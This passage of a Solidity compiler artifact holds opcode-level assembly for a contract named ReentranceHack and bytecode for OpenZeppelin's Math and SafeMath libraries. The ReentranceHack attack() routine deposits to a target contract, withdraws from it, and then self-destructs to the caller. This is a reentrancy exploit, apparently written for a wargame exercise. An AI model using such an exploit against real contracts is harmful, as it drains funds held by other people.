											"name": "LT",
											"source": 1
										},
										{
											"begin": 475,
											"end": 488,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 475,
											"end": 488,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 487,
											"end": 488,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 475,
											"end": 488,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 475,
											"end": 488,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 475,
											"end": 488,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 475,
											"end": 488,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 483,
											"end": 484,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 475,
											"end": 488,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 475,
											"end": 488,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 468,
											"end": 488,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 468,
											"end": 488,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 391,
											"end": 495,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 391,
											"end": 495,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 391,
											"end": 495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 391,
											"end": 495,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 391,
											"end": 495,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1023,
											"end": 1193,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 1023,
											"end": 1193,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1072,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1062,
											"end": 1072,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1072,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1072,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1072,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1062,
											"end": 1072,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1072,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1072,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1072,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1062,
											"end": 1072,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1079,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1062,
											"end": 1079,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1079,
											"name": "PUSH",
											"source": 0,
											"value": "362A95"
										},
										{
											"begin": 1087,
											"end": 1096,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 1106,
											"end": 1110,
											"name": "ADDRESS",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1062,
											"end": 1112,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1128,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1118,
											"end": 1128,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1128,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1128,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1128,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1118,
											"end": 1128,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1128,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1128,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1128,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1118,
											"end": 1128,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1137,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1118,
											"end": 1137,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1137,
											"name": "PUSH",
											"source": 0,
											"value": "2E1A7D4D"
										},
										{
											"begin": 1138,
											"end": 1147,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1118,
											"end": 1148,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1176,
											"end": 1186,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 1155,
											"end": 1188,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1155,
											"end": 1188,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1155,
											"end": 1188,
											"name": "SELFDESTRUCT",
											"source": 0
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"attack()": "9e5faafc"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_reentrance\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Reentrance.sol\":\"ReentranceHack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Reentrance.sol\":{\"keccak256\":\"0x316fb3e7bf686bd45d60e8985e443950af21dcc6f39cc81b4c75470bc97abc3e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8ca71ff1998a2225a347cbca517c69e19cdcde609b99265ecabda937412f1448\",\"dweb:/ipfs/QmQnz8ubTthQvPxvPe2BnLpShzFBU5YyGWn3EoW452uVkD\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":{\"keccak256\":\"0x6c234834003dfb86e2c23d12dfdde7cc01e78013d71b52162cb308b4873562cb\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://f0e3f39b2ec26694a42c89a5d9e489d5228f1880fcf5e375c5c975ba816e5ffe\",\"dweb:/ipfs/QmUErheHopnbBUSLDQAtWsmw6HsEvqTNp1QiBEuSJhmhHn\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xaa0e11a791bc975d581a4f5b7a8d9c16a880a354c89312318ae072ae3e740409\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://982d8b344f76193834260436d74c81e5a8f9e89106bb4cd72bbaabda4f3f59c2\",\"dweb:/ipfs/QmSrvP5TkQRhKDVCTpsV3uaKLBhkt7PjUY89vdtM9o5ybK\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 83,
								"contract": "contracts/Reentrance.sol:ReentranceHack",
								"label": "reentrance",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(Reentrance)81"
							}
						],
						"types": {
							"t_contract(Reentrance)81": {
								"encoding": "inplace",
								"label": "contract Reentrance",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol": {
				"Math": {
					"abi": [],
					"devdoc": {
						"details": "Standard math utilities missing in the Solidity language.",
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":132:800  library Math {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n  0x0b\n  dup3\n  dup3\n  dup3\n  codecopy\n  dup1\n  mload\n  0x00\n  byte\n  0x73\n  eq\n  tag_1\n  jumpi\n  invalid\ntag_1:\n  mstore(0x00, address)\n  0x73\n  dup2\n  mstore8\n  dup3\n  dup2\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":132:800  library Math {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa2646970667358221220cb88a6ea0fc1eef67443dd0bc307cf23423522d9d972ed783886d3180c9579a164736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220cb88a6ea0fc1eef67443dd0bc307cf23423522d9d972ed783886d3180c9579a164736f6c634300060c0033",
							"opcodes": "PUSH1 0x56 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCB DUP9 0xA6 0xEA 0xF 0xC1 0xEE 0xF6 PUSH21 0x43DD0BC307CF23423522D9D972ED783886D3180C95 PUSH26 0xA164736F6C634300060C00330000000000000000000000000000 ",
							"sourceMap": "132:668:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220cb88a6ea0fc1eef67443dd0bc307cf23423522d9d972ed783886d3180c9579a164736f6c634300060c0033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCB DUP9 0xA6 0xEA 0xF 0xC1 0xEE 0xF6 PUSH21 0x43DD0BC307CF23423522D9D972ED783886D3180C95 PUSH26 0xA164736F6C634300060C00330000000000000000000000000000 ",
							"sourceMap": "132:668:1:-:0;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"average(uint256,uint256)": "infinite",
								"max(uint256,uint256)": "infinite",
								"min(uint256,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 132,
									"end": 800,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 800,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 800,
									"name": "PUSH",
									"source": 1,
									"value": "B"
								},
								{
									"begin": 132,
									"end": 800,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 132,
									"end": 800,
									"name": "BYTE",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "PUSH",
									"source": 1,
									"value": "73"
								},
								{
									"begin": 132,
									"end": 800,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 132,
									"end": 800,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "INVALID",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 132,
									"end": 800,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "ADDRESS",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 132,
									"end": 800,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "PUSH",
									"source": 1,
									"value": "73"
								},
								{
									"begin": 132,
									"end": 800,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "MSTORE8",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 132,
									"end": 800,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220cb88a6ea0fc1eef67443dd0bc307cf23423522d9d972ed783886d3180c9579a164736f6c634300060c0033",
									".code": [
										{
											"begin": 132,
											"end": 800,
											"name": "PUSHDEPLOYADDRESS",
											"source": 1
										},
										{
											"begin": 132,
											"end": 800,
											"name": "ADDRESS",
											"source": 1
										},
										{
											"begin": 132,
											"end": 800,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 132,
											"end": 800,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 132,
											"end": 800,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 132,
											"end": 800,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 132,
											"end": 800,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 132,
											"end": 800,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 132,
											"end": 800,
											"name": "REVERT",
											"source": 1
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Standard math utilities missing in the Solidity language.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":\"Math\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":{\"keccak256\":\"0x6c234834003dfb86e2c23d12dfdde7cc01e78013d71b52162cb308b4873562cb\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://f0e3f39b2ec26694a42c89a5d9e489d5228f1880fcf5e375c5c975ba816e5ffe\",\"dweb:/ipfs/QmUErheHopnbBUSLDQAtWsmw6HsEvqTNp1QiBEuSJhmhHn\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"details": "Wrappers over Solidity's arithmetic operations with added overflow checks. Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.",
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":622:5210  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n  0x0b\n  dup3\n  dup3\n  dup3\n  codecopy\n  dup1\n  mload\n  0x00\n  byte\n  0x73\n  eq\n  tag_1\n  jumpi\n  invalid\ntag_1:\n  mstore(0x00, address)\n  0x73\n  dup2\n  mstore8\n  dup3\n  dup2\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":622:5210  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa264697066735822122030cb6e63ed0c592b58a945ea71862980410e9bae31441a6675f437262f9c353964736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122030cb6e63ed0c592b58a945ea71862980410e9bae31441a6675f437262f9c353964736f6c634300060c0033",
